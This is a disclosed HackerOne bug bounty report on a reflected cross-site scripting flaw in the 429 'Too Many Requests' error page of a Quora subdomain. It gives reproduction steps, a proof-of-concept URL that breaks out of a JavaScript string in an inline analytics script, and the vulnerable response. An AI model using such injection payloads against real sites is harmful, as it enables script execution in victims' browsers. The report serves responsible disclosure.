# [controlsyou.quora.com] 429 Too Many Requests Error-Page XSS

## Report Details
- **Report ID**: 189768
- **URL**: https://hackerone.com/reports/189768
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2016-12-09T09:03:47.961Z
- **Disclosed**: 2017-03-31T19:35:43.972Z

## Reporter
- **Username**: bobrov
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: quora

## Vulnerability Information
**Summary:**
XSS on the error page when the user makes too many requests.

### Steps To Reproduce

1. Make a lot of requests to get the error 429
2. Open PoC in FireFox

```
https://controlsyou.quora.com/'-alert(document.domain)-'
``` 

**HTTP Response**
```
<script type="text/javascript">
...
ga('set', 'dimension1', 'board-'-alert(document.domain)-'');
ga('set', 'dimension2', 'False');
ga('set', 'dimension3', 'False');});});</script>
```


### Optional: Your Environment (Browser version, Device, app version, os version etc)
Tested on FireFox 50.0.2

## Attachments
No attachments
